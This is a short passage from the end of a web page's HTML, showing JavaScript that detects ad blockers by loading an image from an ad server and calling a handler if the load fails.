        var node = document.getElementsByTagName('script')[0];
        node.parentNode.insertBefore(ad_detect, node);

        var ad_detectImg = document.createElement('img');
        ad_detectImg.addEventListener('error', function() {
            //adblock is detected at this step.
            doAdblockDetectedActionOnce();
        });
        ad_detectImg.src = "//ad.doubleclick.net/favicon.ico?ad=300x250&ad_box_=1&adnet=1&showad=1&size=250x250";
    }

</script>


</body>
</html>